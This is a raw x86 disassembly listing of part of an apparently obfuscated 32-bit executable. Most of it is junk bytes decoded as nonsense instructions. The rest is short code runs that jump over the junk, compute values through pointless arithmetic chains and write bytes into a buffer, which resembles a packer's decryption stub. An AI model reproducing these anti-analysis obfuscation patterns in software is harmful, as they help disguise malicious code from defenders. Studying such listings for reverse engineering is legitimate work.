  409f8e:	(bad)  
  409f8f:	mul    DWORD PTR [edx]
  409f91:	js     0x409f92
  409f93:	out    0x3a,eax
  409f95:	clc    
  409f96:	xor    eax,0x7eea0cff
  409f9b:	xor    esp,eax
  409f9d:	dec    edx
  409f9e:	sbb    BYTE PTR [edx+edx*8],bl
  409fa1:	inc    ebp
  409fa2:	dec    eax
  409fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fa4:	cmp    al,BYTE PTR ds:0x80037fe5
  409faa:	mov    DWORD PTR [eax+edi*2+0x48],ebx
  409fae:	shl    ecx,0x5
  409fb1:	sbb    DWORD PTR [ebp+0x39],ecx
  409fb4:	(bad)  
  409fb6:	xor    ch,BYTE PTR [eax]
  409fb8:	bound  esp,QWORD PTR ds:0x3a38052c
  409fbe:	dec    esi
  409fbf:	cs cld 
  409fc1:	mov    edx,0xdb6fd95
  409fc6:	mov    ebx,0x6656a58b
  409fcb:	enter  0x5b8a,0xbb
  409fcf:	mov    WORD PTR [esi-0x2a],gs
  409fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd3:	pop    edx
  409fd4:	ss enter 0xd79e,0x17
  409fd9:	jne    0x40a023
  409fdb:	retf   
  409fdc:	inc    edx
  409fdd:	xchg   BYTE PTR [edx+eax*1-0x5e],ch
  409fe1:	outs   dx,DWORD PTR ds:[esi]
  409fe2:	cdq    
  409fe3:	dec    ebp
  409fe4:	mov    ebx,0x7f2610d8
  409fe9:	lods   eax,DWORD PTR ds:[esi]
  409fea:	in     al,0x4b
  409fec:	mov    fs,WORD PTR [edi]
  409fee:	mov    al,0x23
  409ff0:	push   ss
  409ff1:	jbe    0x409fdd
  409ff3:	cmp    eax,0xdbbdff4d
  409ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ff9:	dec    ebx
  409ffa:	xchg   edx,eax
  409ffb:	icebp  
  409ffc:	push   es
  409ffd:	je     0x409fda
  409fff:	shr    DWORD PTR [edx+0x25],0xb3
  40a003:	(bad)  
  40a004:	xor    al,0xdb
  40a006:	mov    bl,0xc
  40a008:	addr16 pusha 
  40a00a:	mov    ah,0x29
  40a00c:	or     DWORD PTR [ebx-0x734afdc4],eax
  40a012:	jb     0x409fe4
  40a014:	mov    al,0x5f
  40a016:	pop    esi
  40a017:	stc    
  40a018:	mov    dl,0x72
  40a01a:	pushf  
  40a01b:	xchg   ebx,eax
  40a01c:	push   0x7f
  40a01e:	inc    edi
  40a01f:	sti    
  40a020:	xor    ebx,DWORD PTR [ecx-0x3f]
  40a023:	and    eax,edi
  40a025:	mov    ecx,0xaa13d853
  40a02a:	pop    es
  40a02b:	xor    dh,BYTE PTR ds:0x8578156
  40a031:	not    BYTE PTR [edi+0x3d146386]
  40a037:	es push ebx
  40a039:	loopne 0x40a033
  40a03b:	ficom  WORD PTR [esp+esi*2]
  40a03e:	sub    eax,DWORD PTR [esi]
  40a040:	and    eax,0xb11a9b94
  40a045:	sar    DWORD PTR [ebp-0x16],1
  40a048:	mov    edi,0x87e34578
  40a04d:	xor    eax,0xe78f9376
  40a052:	xor    DWORD PTR [edx],ecx
  40a054:	repz data16 rol BYTE PTR [eax],1
  40a058:	cli    
  40a059:	lock push cs
  40a05b:	mov    al,BYTE PTR [ebp+ebx*2+0x74edd68f]
  40a062:	inc    eax
  40a063:	scas   al,BYTE PTR es:[edi]
  40a064:	jmp    0x73e6:0xea7956f7
  40a06b:	pop    ebp
  40a06c:	cmp    ecx,edi
  40a06e:	retf   
  40a06f:	inc    edi
  40a070:	and    bl,BYTE PTR [edx-0x3b]
  40a073:	and    ebx,eax
  40a075:	in     al,dx
  40a076:	xor    esp,ecx
  40a078:	repnz into 
  40a07a:	or     eax,0x18c55c3d
  40a07f:	repz xor al,0xcc
  40a082:	nop
  40a083:	sahf   
  40a084:	jnp    0x40a04d
  40a086:	add    WORD PTR [ecx-0x16137835],si
  40a08d:	(bad)  
  40a08e:	out    0x46,eax
  40a090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a091:	repz jle 0x40a10f
  40a094:	je     0x40a021
  40a096:	mov    al,0x6b
  40a098:	jle    0x40a0a0
  40a09a:	mov    esp,0x52dbac26
  40a09f:	lds    edi,FWORD PTR [eax-0x2c0b5a14]
  40a0a5:	bound  ecx,QWORD PTR [eax]
  40a0a7:	inc    ebx
  40a0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a9:	gs test eax,0xf68f0f95
  40a0af:	cs fwait
  40a0b1:	dec    ebp
  40a0b2:	or     esp,DWORD PTR es:[eax]
  40a0b5:	cwde   
  40a0b6:	mov    WORD PTR cs:[edi+ebp*4-0x13],fs
  40a0bb:	inc    esi
  40a0bc:	jmp    0x5bef0d60
  40a0c1:	push   es
  40a0c2:	les    esi,FWORD PTR [ecx-0x4a70b4ac]
  40a0c8:	xor    cl,BYTE PTR [edx-0x48da244a]
  40a0ce:	or     esp,DWORD PTR [edi+esi*2+0x5d]
  40a0d2:	mov    edx,0xcb180e06
  40a0d7:	push   es
  40a0d8:	mov    cl,0x59
  40a0da:	add    eax,0xc5a7b3bd
  40a0df:	in     al,0xcb
  40a0e1:	aam    0x9b
  40a0e3:	popa   
  40a0e4:	mov    eax,ds:0x59eb9447
  40a0e9:	push   edx
  40a0ea:	or     al,0x8b
  40a0ec:	jge    0x40a12c
  40a0ee:	jmp    0xfec:0x558b1f15
  40a0f5:	lods   al,BYTE PTR ds:[esi]
  40a0f6:	rol    BYTE PTR [edx],1
  40a0f8:	xor    eax,ecx
  40a0fa:	mov    ecx,DWORD PTR [ebp-0x18]
  40a0fd:	shr    edx,0x2
  40a100:	mov    edx,DWORD PTR [ebp-0x14]
  40a103:	xor    edx,edx
  40a105:	shl    ecx,0x1e
  40a108:	or     eax,edx
  40a10a:	mov    ds:0x422810,eax
  40a10f:	pop    esi
  40a110:	leave  
  40a111:	ret    
  40a112:	push   ebp
  40a113:	mov    ebp,esp
  40a115:	sub    esp,0x28
  40a118:	push   ebx
  40a119:	push   esi
  40a11a:	push   edi
  40a11b:	mov    DWORD PTR [ebp-0x10],0x67e2
  40a122:	jmp    0x40a3b9
  40a127:	mov    al,ds:0xfc9cf9a5
  40a12c:	pushf  
  40a12d:	mov    al,ds:0xd54f94b9
  40a132:	jecxz  0x40a113
  40a134:	push   es
  40a135:	push   eax
  40a136:	sahf   
  40a137:	es xchg ebp,eax
  40a139:	mov    esi,0xbec2a9be
  40a13e:	mov    esi,0x89fdd890
  40a143:	out    0x2d,al
  40a145:	cmp    dh,BYTE PTR [ebx+0x40c9ddf9]
  40a14b:	cli    
  40a14c:	pop    ecx
  40a14d:	mov    dh,0x7
  40a14f:	or     BYTE PTR [ebx+0x72],cl
  40a152:	add    eax,0xda95d7a
  40a157:	imul   esi,eax,0x10edd9dc
  40a15d:	imul   edx,DWORD PTR [ebp-0x16],0xffffffed
  40a161:	dec    ecx
  40a162:	out    0x11,eax
  40a164:	and    ebp,0x66108de4
  40a16a:	push   esp
  40a16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a16c:	repz or al,0xca
  40a16f:	stos   BYTE PTR es:[edi],al
  40a170:	lahf   
  40a171:	xchg   edi,eax
  40a172:	inc    esi
  40a173:	(bad)  
  40a174:	xchg   edi,eax
  40a175:	push   edx
  40a176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a177:	int3   
  40a178:	adc    DWORD PTR [edx],edx
  40a17a:	xor    BYTE PTR gs:[esi+0x2c],al
  40a17e:	dec    ebp
  40a17f:	xchg   edi,eax
  40a180:	sub    eax,0x3533ecfc
  40a185:	pop    edi
  40a186:	jnp    0x40a173
  40a188:	cmp    al,0xdb
  40a18a:	leave  
  40a18b:	or     ah,al
  40a18d:	xchg   edi,eax
  40a18e:	in     al,0x30
  40a190:	les    eax,FWORD PTR [ecx]
  40a192:	adc    edi,DWORD PTR [eax-0x2462315a]
  40a198:	inc    esp
  40a199:	xor    esi,DWORD PTR [eax-0x4aad0247]
  40a19f:	lods   al,BYTE PTR ds:[esi]
  40a1a0:	push   0xffffffea
  40a1a2:	jecxz  0x40a169
  40a1a4:	add    al,0xa7
  40a1a6:	xlat   BYTE PTR ss:[ebx]
  40a1a8:	dec    esp
  40a1a9:	call   0xff4f:0x5c6047ec
  40a1b0:	xchg   esi,eax
  40a1b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1b2:	push   esp
  40a1b3:	push   edx
  40a1b4:	pop    ebx
  40a1b5:	cmp    eax,0x837c8f0f
  40a1ba:	bound  esp,QWORD PTR [edi]
  40a1bc:	lea    eax,[esi]
  40a1be:	xchg   edi,eax
  40a1bf:	xor    eax,0xfc7511d5
  40a1c4:	(bad)  
  40a1c5:	xor    ebp,DWORD PTR [ebp-0x2]
  40a1c8:	ins    BYTE PTR es:[edi],dx
  40a1c9:	add    BYTE PTR [ebp-0x5c5b89f6],cl
  40a1cf:	jnp    0x40a1ad
  40a1d1:	mov    esi,0x5edc2750
  40a1d6:	je     0x40a195
  40a1d8:	mov    bl,0xf7
  40a1da:	sahf   
  40a1db:	and    eax,0x114fff52
  40a1e0:	out    dx,eax
  40a1e1:	cmp    al,0x18
  40a1e3:	cmp    bl,BYTE PTR [ecx-0x4ab5ae1f]
  40a1e9:	pop    esp
  40a1ea:	icebp  
  40a1eb:	jmp    0x1b5:0x8b06276f
  40a1f2:	pop    es
  40a1f3:	push   ss
  40a1f4:	aad    0x92
  40a1f6:	xchg   edx,eax
  40a1f7:	loop   0x40a212
  40a1f9:	aad    0x98
  40a1fb:	inc    edx
  40a1fc:	mov    bl,0xb2
  40a1fe:	xor    al,0x15
  40a200:	aad    0xe4
  40a202:	mov    eax,ds:0xa474cbda
  40a207:	pop    eax
  40a208:	adc    BYTE PTR [esi+0x35fa558e],cl
  40a20e:	sbb    BYTE PTR [esi+edi*1-0x6f],ch
  40a212:	cmovb  ecx,DWORD PTR [eax+0x72]
  40a216:	loopne 0x40a210
  40a218:	mov    DWORD PTR [edi-0x5eddca7a],0xceb4de7b
  40a222:	leave  
  40a223:	lahf   
  40a224:	pop    ebp
  40a225:	stos   DWORD PTR es:[edi],eax
  40a226:	sub    al,0x66
  40a228:	test   esp,ebx
  40a22a:	shr    bl,cl
  40a22c:	int3   
  40a22d:	cmp    cl,BYTE PTR [ebx+0x4a]
  40a230:	imul   BYTE PTR [edi+0x66]
  40a233:	xchg   ebx,eax
  40a234:	lds    ecx,FWORD PTR [eax]
  40a236:	mov    esi,DWORD PTR [eax]
  40a238:	adc    eax,0x22453c5a
  40a23d:	lods   al,BYTE PTR ds:[esi]
  40a23e:	into   
  40a23f:	mov    al,ds:0xeb9b8a3
  40a244:	jge    0x40a25b
  40a246:	repnz push es
  40a248:	aaa    
  40a249:	or     al,0xac
  40a24b:	push   esp
  40a24c:	sub    bl,BYTE PTR [edi+0x70]
  40a24f:	inc    eax
  40a250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a251:	(bad)  
  40a252:	mov    ah,0x69
  40a254:	mov    cl,0x90
  40a256:	ins    BYTE PTR es:[edi],dx
  40a257:	int    0x7a
  40a259:	das    
  40a25a:	test   DWORD PTR [esi+0x47a3c1bf],ebp
  40a260:	lock inc esp
  40a262:	ja     0x40a271
  40a264:	pop    ss
  40a265:	leave  
  40a266:	jp     0x40a252
  40a268:	cmp    dl,BYTE PTR [ebx]
  40a26a:	test   BYTE PTR [ebp-0x1266b043],dl
  40a270:	jmp    0x92071ef2
  40a275:	mov    ch,0x1b
  40a277:	xor    eax,0xd01b50f1
  40a27c:	addr16 jge 0x40a2c1
  40a27f:	adc    BYTE PTR [edi+0x38f71a14],ch
  40a285:	out    0x9e,al
  40a287:	hlt    
  40a288:	xchg   esi,eax
  40a289:	inc    ebp
  40a28a:	push   eax
  40a28b:	inc    ebp
  40a28c:	xchg   esi,eax
  40a28d:	sub    eax,0xc42a8adc
  40a292:	dec    ebx
  40a293:	ins    DWORD PTR es:[edi],dx
  40a294:	sbb    bh,al
  40a296:	out    0xc2,eax
  40a298:	out    0xab,al
  40a29a:	or     ch,BYTE PTR [esi+0x50]
  40a29d:	out    0xed,al
  40a29f:	dec    esi
  40a2a0:	inc    edx
  40a2a1:	and    al,0x76
  40a2a3:	or     eax,0x3e6719db
  40a2a8:	test   al,0x62
  40a2aa:	dec    eax
  40a2ab:	out    dx,al
  40a2ac:	ret    0xd820
  40a2af:	aas    
  40a2b0:	(bad)  
  40a2b1:	in     eax,dx
  40a2b2:	push   cs
  40a2b3:	lds    edi,FWORD PTR [edx-0x56cd573c]
  40a2b9:	sbb    al,0xef
  40a2bb:	inc    ecx
  40a2bc:	sar    cl,1
  40a2be:	loope  0x40a328
  40a2c0:	cmp    ch,ah
  40a2c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2c3:	jle    0x40a252
  40a2c5:	int3   
  40a2c6:	pop    esp
  40a2c7:	jge    0x40a330
  40a2c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2ca:	neg    bl
  40a2cc:	lea    edx,[ecx]
  40a2ce:	and    BYTE PTR [edi+0xe],al
  40a2d1:	mov    WORD PTR [edi],ax
  40a2d4:	dec    edi
  40a2d5:	addr16 idiv esi
  40a2d8:	out    dx,eax
  40a2d9:	imul   edi,edx,0x1b7fbff8
  40a2df:	aam    0x3c
  40a2e1:	push   eax
  40a2e2:	dec    ebx
  40a2e3:	imul   esi,DWORD PTR [esi],0x915f4e31
  40a2e9:	xor    esi,eax
  40a2eb:	mov    ss,WORD PTR [esi-0x464cbcf]
  40a2f1:	mov    ?,WORD PTR [esi+0x1]
  40a2f4:	mov    edi,0x1f0cac39
  40a2f9:	pop    esi
  40a2fa:	stos   BYTE PTR es:[edi],al
  40a2fb:	sub    DWORD PTR [ecx-0x25ed4a25],edx
  40a301:	ret    
  40a302:	and    bh,al
  40a304:	sbb    esi,DWORD PTR [ecx+0x7f6a5cd4]
  40a30a:	and    ecx,DWORD PTR [ebp+eax*2+0x262471c4]
  40a311:	pop    edi
  40a312:	aaa    
  40a313:	ret    
  40a314:	push   ecx
  40a315:	and    bl,BYTE PTR [edi-0x55184366]
  40a31b:	xor    DWORD PTR [esp+edx*8],esp
  40a31e:	jb     0x40a2ae
  40a320:	out    0xc1,al
  40a322:	push   ss
  40a323:	dec    ebp
  40a325:	call   DWORD PTR [ebx-0xa]
  40a328:	icebp  
  40a329:	dec    ebx
  40a32a:	pop    ecx
  40a32b:	sbb    DWORD PTR [edi],ebx
  40a32d:	sbb    eax,0xfbc449ad
  40a332:	imul   DWORD PTR [esi-0x13]
  40a335:	cmp    BYTE PTR [ebp+0x75600158],cl
  40a33b:	call   0xcd18:0x263341b2
  40a342:	in     al,0x8f
  40a344:	add    eax,DWORD PTR [ebx+0x57]
  40a347:	lods   al,BYTE PTR ds:[esi]
  40a348:	cs int3 
  40a34a:	mov    eax,DWORD PTR [ecx+0x3bc74efe]
  40a350:	(bad)  
  40a351:	jp     0x40a3b1
  40a353:	mov    edx,DWORD PTR [esi+ebp*4-0x1440b371]
  40a35a:	js     0x40a323
  40a35c:	adc    eax,0xf381ca6e
  40a361:	clc    
  40a362:	and    eax,0xab38dd36
  40a367:	mov    bh,0xfc
  40a369:	sub    al,0xa
  40a36b:	or     al,0x43
  40a36d:	mov    ch,ch
  40a36f:	test   eax,0xa49005a3
  40a374:	jl     0x40a388
  40a376:	pop    ds
  40a377:	adc    eax,0x94cd6270
  40a37c:	inc    ecx
  40a37d:	jl     0x40a386
  40a37f:	dec    esp
  40a380:	cmp    al,0xea
  40a382:	stos   DWORD PTR es:[edi],eax
  40a383:	imul   DWORD PTR [esp+edi*2+0x19]
  40a387:	inc    edi
  40a388:	dec    esp
  40a389:	test   al,0xf0
  40a38b:	mov    dl,0x34
  40a38d:	sub    eax,0x440422ed
  40a392:	dec    esi
  40a393:	mov    cl,0xe
  40a395:	inc    ebx
  40a396:	out    0xfc,al
  40a398:	rcr    DWORD PTR [ebp+0x55],cl
  40a39b:	aam    0x6b
  40a39d:	scas   eax,DWORD PTR es:[edi]
  40a39e:	lahf   
  40a39f:	xor    al,0x49
  40a3a1:	sbb    eax,0xb5d3902
  40a3a6:	loop   0x40a33c
  40a3a8:	adc    eax,0x102773a7
  40a3ad:	mov    dl,0xa4
  40a3af:	inc    esi
  40a3b0:	fwait
  40a3b1:	inc    edi
  40a3b2:	cmp    cl,BYTE PTR [edi-0x7e]
  40a3b5:	lds    eax,FWORD PTR [ebx]
  40a3b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3b8:	cmp    al,bh
  40a3ba:	inc    ebp
  40a3bb:	cld    
  40a3bc:	es inc edi
  40a3be:	add    BYTE PTR [eax],al
  40a3c0:	mov    DWORD PTR [ebp-0x8],0x580
  40a3c7:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40a3ce:	mov    DWORD PTR [ebp-0x28],0x3294
  40a3d5:	mov    DWORD PTR [ebp-0x24],0x643
  40a3dc:	mov    DWORD PTR [ebp-0x20],0x2545
  40a3e3:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40a3ea:	xor    ebx,ebx
  40a3ec:	inc    ebx
  40a3ed:	jmp    0x40a684
  40a3f2:	ins    DWORD PTR es:[edi],dx
  40a3f3:	shr    ebx,0x9a
  40a3f6:	jl     0x40a3b4
  40a3f8:	scas   eax,DWORD PTR es:[edi]
  40a3f9:	sub    bl,BYTE PTR [ebx+ebp*1-0x7a]
  40a3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fe:	int    0xf
  40a400:	mov    ah,0xcf
  40a402:	adc    DWORD PTR [ebx-0x3d564142],ebx
  40a408:	mov    esi,0x922fd5be
  40a40d:	sar    DWORD PTR [ebp-0x7a217a2c],0xc1
  40a414:	sub    BYTE PTR [edi+0x35dae747],ah
  40a41a:	push   ebx
  40a41b:	push   ebp
  40a41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a41d:	push   0xffffffce
  40a41f:	jne    0x40a3a4
  40a421:	push   ds
  40a422:	test   al,0x97
  40a424:	lods   eax,DWORD PTR ds:[esi]
  40a425:	xchg   ebx,eax
  40a426:	aas    
  40a427:	popa   
  40a428:	or     bh,dl
  40a42a:	jno    0x40a419
  40a42c:	adc    eax,0x99907ca5
  40a431:	mov    al,ds:0xc7270ed3
  40a436:	enter  0xbf1c,0xc9
  40a43a:	and    eax,0x148a3ee0
  40a43f:	jb     0x40a3f4
  40a441:	push   edi
  40a442:	adc    BYTE PTR [edi+0x2bf1f4f8],cl
  40a448:	loope  0x40a45e
  40a44a:	imul   edx,DWORD PTR [eax],0x8
  40a44d:	aad    0x96
  40a44f:	call   0x6da4df42
  40a454:	and    DWORD PTR gs:[edx-0x3d536991],0x5c2151cc
  40a45f:	nop
  40a460:	push   esi
  40a461:	mov    DWORD PTR [ebp-0x19b9f78a],esp
  40a467:	stos   DWORD PTR es:[edi],eax
  40a468:	inc    ebp
  40a469:	pop    esi
  40a46a:	add    DWORD PTR [ebp-0x7a85380a],ecx
  40a470:	push   0xffffffe2
  40a472:	(bad)  
  40a473:	push   ecx
  40a474:	dec    esi
  40a475:	imul   esp,edi,0x3f12723a
  40a47b:	pop    ecx
  40a47c:	mov    dh,0x3b
  40a47e:	mov    ?,WORD PTR [edx]
  40a480:	retf   
  40a481:	or     eax,0x42926419
  40a487:	mov    ebp,0x8ee2209
  40a48c:	stc    
  40a48d:	jp     0x40a470
  40a48f:	xchg   esp,eax
  40a490:	adc    al,BYTE PTR [ebx+ecx*4-0x24]
  40a494:	mov    al,ds:0x9537153d
  40a499:	mov    bh,0x22
  40a49b:	dec    edx
  40a49c:	out    0xb6,al
  40a49e:	or     ebp,DWORD PTR [eax-0x40]
  40a4a1:	sbb    DWORD PTR [edx+0x2af9b125],edi
  40a4a7:	inc    eax
  40a4a8:	xchg   ecx,eax
  40a4a9:	enter  0x8ea2,0xe0
  40a4ad:	lods   al,BYTE PTR ds:[esi]
  40a4ae:	pushf  
  40a4af:	push   ebp
  40a4b0:	add    al,0x64
  40a4b2:	xchg   ebx,eax
  40a4b3:	mov    bl,0x19
  40a4b5:	mov    BYTE PTR [ecx+0x26],al
  40a4b8:	(bad)  
  40a4b9:	pop    eax
  40a4ba:	sub    eax,0xf3b8adb7
  40a4bf:	sahf   
  40a4c0:	into   
  40a4c1:	je     0x40a454
  40a4c3:	xchg   esi,eax
  40a4c4:	fadd   DWORD PTR [eax+edi*2]
  40a4c7:	add    edi,DWORD PTR ds:0xb4fede20
  40a4cd:	sbb    edx,DWORD PTR [eax-0x76]
  40a4d0:	das    
  40a4d1:	je     0x40a50c
  40a4d3:	or     DWORD PTR [esi],0x163199ba
  40a4d9:	fiadd  DWORD PTR [edx]
  40a4db:	lds    ebx,FWORD PTR [edi-0x62]
  40a4de:	icebp  
  40a4df:	test   eax,0x48fdcb27
  40a4e4:	pushw  ss
  40a4e6:	loope  0x40a49c
  40a4e8:	sar    BYTE PTR [ebp-0x5a9e588c],cl
  40a4ee:	xor    BYTE PTR [ebx+0x44],cl
  40a4f1:	out    dx,al
  40a4f2:	mov    bl,0x4d
  40a4f4:	jae    0x40a4f8
  40a4f6:	ds xchg ebx,eax
  40a4f8:	sbb    eax,0x7f47d762
  40a4fd:	ret    
  40a4fe:	shl    edx,cl
  40a500:	test   BYTE PTR [ebx],bh
  40a502:	test   al,0x67
  40a504:	mov    al,ds:0x72b8f040
  40a509:	lea    ebp,[edi]
  40a50b:	test   DWORD PTR [esi],esp
  40a50d:	fiadd  WORD PTR [ecx-0x73]
  40a510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a511:	imul   ecx,DWORD PTR [eax-0x3fd1dd2f],0x8609dfb4
  40a51b:	addr16 and eax,0x25b8a074
  40a521:	outs   dx,BYTE PTR ds:[esi]
  40a522:	cmc    
  40a523:	and    bl,bh
  40a525:	adc    ebp,DWORD PTR [edi+0x6c]
  40a528:	test   BYTE PTR [edi],bl
  40a52a:	dec    ecx
  40a52b:	je     0x40a510
  40a52d:	add    al,0xbb
  40a52f:	adc    DWORD PTR ds:0x6f7587b7,esp
  40a535:	int3   
  40a536:	aam    0xe
  40a538:	les    ecx,FWORD PTR cs:[ecx-0x45]
  40a53c:	fwait
  40a53d:	out    0x2d,eax
  40a53f:	sub    bh,0xc2
  40a542:	adc    ah,BYTE PTR [eax+0x1e9bd2f6]
  40a548:	pop    esi
  40a549:	jnp    0x40a583
  40a54b:	cmp    ah,BYTE PTR [eax]
  40a54d:	cmc    
  40a54e:	ins    BYTE PTR es:[edi],dx
  40a54f:	dec    ecx
  40a550:	call   0xa4d9abae
  40a555:	push   0xf2c500a
  40a55a:	or     ebp,ebp
  40a55c:	mov    edi,0x8c21da71
  40a561:	dec    edx
  40a562:	cdq    
  40a563:	mov    ch,dl
  40a565:	dec    ecx
  40a566:	mov    cl,0x24
  40a568:	fbstp  TBYTE PTR [esi]
  40a56a:	imul   ebx,DWORD PTR [esi],0x27557df2
  40a570:	fcom   QWORD PTR [eax-0x25]
  40a573:	adc    al,0x2b
  40a575:	in     al,dx
  40a576:	pop    ds
  40a577:	mov    esp,edi
  40a579:	(bad)  
  40a57a:	mov    ch,0xe1
  40a57c:	or     eax,0x6b7a2eac
  40a581:	jg     0x40a57b
  40a583:	ja     0x40a5c2
  40a585:	adc    esp,eax
  40a587:	xchg   esi,eax
  40a588:	aad    0x6b
  40a58a:	imul   esi,DWORD PTR [eax+0x39db3b59],0xfffffff0
  40a591:	inc    ecx
  40a592:	fwait
  40a593:	sub    BYTE PTR [ebx+ebp*8-0x65],dl
  40a597:	loopne 0x40a600
  40a599:	sub    ebp,DWORD PTR [ebx-0x2604f4d1]
  40a59f:	sub    bh,BYTE PTR [eax+0x4a140fb6]
  40a5a5:	inc    ebp
  40a5a6:	sub    BYTE PTR [eax+0x63],bl
  40a5a9:	sub    ah,0xd2
  40a5ac:	into   
  40a5ad:	cld    
  40a5ae:	(bad)  [ebx+edx*8+0x2d]
  40a5b2:	dec    eax
  40a5b3:	daa    
  40a5b4:	rcr    BYTE PTR [eax],cl
  40a5b6:	add    esi,DWORD PTR [edi*2-0x52dca2a]
  40a5bd:	push   ds
  40a5be:	les    eax,FWORD PTR [eax+ebx*4-0x335811c]
  40a5c5:	mov    edi,edx
  40a5c7:	jle    0x40a5d0
  40a5c9:	data16 in al,dx
  40a5cb:	mov    bh,BYTE PTR ss:[ecx+ebp*4+0x61]
  40a5d0:	out    0x7a,al
  40a5d2:	inc    edi
  40a5d3:	shl    al,cl
  40a5d5:	(bad)  
  40a5d6:	repnz movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40a5d9:	sub    al,0xc4
  40a5db:	xchg   ecx,eax
  40a5dc:	push   eax
  40a5dd:	sar    BYTE PTR [esi],0xb2
  40a5e0:	es dec esi
  40a5e2:	push   ss
  40a5e3:	inc    edx
  40a5e4:	dec    ecx
  40a5e5:	int    0x88
  40a5e7:	pusha  
  40a5e8:	leave  
  40a5e9:	test   eax,0x9ffc31ea
  40a5ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5ef:	xchg   BYTE PTR [ecx+0x4c3f9a5c],dl
  40a5f5:	test   BYTE PTR [edx],dh
  40a5f7:	sar    BYTE PTR [ecx-0x6ff123e8],0x15
  40a5fe:	out    dx,al
  40a5ff:	jecxz  0x40a64b
  40a601:	sbb    al,0x49
  40a603:	mov    eax,DWORD PTR [esi-0x35]
  40a606:	popa   
  40a607:	fisub  DWORD PTR [ebp+ebx*1-0x4b]
  40a60b:	mov    gs,WORD PTR [ebp-0x68]
  40a60e:	mov    bh,0xa3
  40a610:	icebp  
  40a611:	outs   dx,DWORD PTR ds:[esi]
  40a612:	jo     0x40a612
  40a614:	es pop esi
  40a616:	push   ss
  40a617:	test   al,0xab
  40a619:	lds    ebp,FWORD PTR [edx-0x71]
  40a61c:	not    bh
  40a61e:	and    bh,BYTE PTR [ecx]
  40a620:	sub    ebp,DWORD PTR [edx-0x18c23423]
  40a626:	mov    edx,0xae350be7
  40a62b:	cmp    BYTE PTR [edi],cl
  40a62d:	out    0x9f,eax
  40a62f:	lea    edx,[ebx+0x2bab412a]
  40a635:	cli    
  40a636:	pop    ecx
  40a637:	sbb    al,0x27
  40a639:	and    BYTE PTR ds:0x7a530ecc,dh
  40a63f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a640:	sub    bl,BYTE PTR [edi]
  40a642:	cmp    al,0x6f
  40a644:	pop    ecx
  40a645:	shr    BYTE PTR [esi+0x50],cl
  40a648:	jge    0x40a5cc
  40a64a:	stc    
  40a64b:	mov    bl,0xe
  40a64d:	jae    0x40a63e
  40a64f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a650:	pop    ss
  40a651:	retf   
  40a652:	ret    0xa748
  40a655:	lahf   
  40a656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a657:	xor    BYTE PTR [ecx+0x6f],dh
  40a65a:	sahf   
  40a65b:	or     al,al
  40a65d:	cli    
  40a65e:	lds    ebx,FWORD PTR [edi+0x3d]
  40a661:	dec    esi
  40a662:	loope  0x40a636
  40a664:	mov    ecx,0xcbd76a86
  40a669:	(bad)  
  40a66a:	mov    eax,ds:0x297210ed
  40a66f:	jg     0x40a605
  40a671:	lock cwde 
  40a673:	add    eax,0x7ab30d68
  40a678:	jmp    0xf938:0x1ae1a37f
  40a67f:	mov    al,0x2f
  40a681:	dec    ecx
  40a682:	(bad)  
  40a683:	ins    DWORD PTR es:[edi],dx
  40a684:	mov    DWORD PTR [ebp-0x18],ebx
  40a687:	mov    DWORD PTR [ebp-0x14],0x76b1
  40a68e:	mov    ecx,DWORD PTR [ebp-0x8]
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	sub    ecx,eax
  40a696:	add    ecx,DWORD PTR [ebp-0xc]
  40a699:	add    ecx,DWORD PTR [ebp-0x10]
  40a69c:	imul   ecx,ecx,0x1f80
  40a6a2:	add    ecx,0x727e
  40a6a8:	xor    ecx,0x106c92f2
  40a6ae:	mov    DWORD PTR [ebp-0x8],0x113c
  40a6b5:	mov    DWORD PTR [ebp-0xc],0x3d61
  40a6bc:	mov    DWORD PTR [ebp-0x10],0x16e9
  40a6c3:	mov    DWORD PTR [ebp-0x4],0x21aa
  40a6ca:	mov    eax,DWORD PTR [ebp-0x10]
  40a6cd:	or     eax,0x3611
  40a6d2:	add    eax,DWORD PTR [ebp-0xc]
  40a6d5:	mov    edx,DWORD PTR [ebp-0x8]
  40a6d8:	and    eax,edx
  40a6da:	mov    edx,ecx
  40a6dc:	sub    edx,eax
  40a6de:	mov    eax,DWORD PTR [ebp-0x4]
  40a6e1:	mov    esi,DWORD PTR ds:0x422708
  40a6e7:	mov    esi,DWORD PTR [esi+0x1cc]
  40a6ed:	add    eax,0x6772
  40a6f2:	or     eax,0x1f24
  40a6f7:	sub    eax,0x7046
  40a6fc:	xor    eax,0x497a
  40a701:	sub    esi,eax
  40a703:	mov    eax,DWORD PTR [ebp+0x8]
  40a706:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40a70d:	mov    BYTE PTR [esi+ecx*1],al
  40a710:	mov    eax,DWORD PTR [ebp-0x14]
  40a713:	mov    esi,DWORD PTR [ebp-0x18]
  40a716:	and    eax,0x2389
  40a71b:	xor    eax,0x695
  40a720:	xor    edx,edx
  40a722:	div    esi
  40a724:	lea    ecx,[ecx+eax*1-0x2413]
  40a72b:	mov    eax,DWORD PTR [ebp-0x1c]
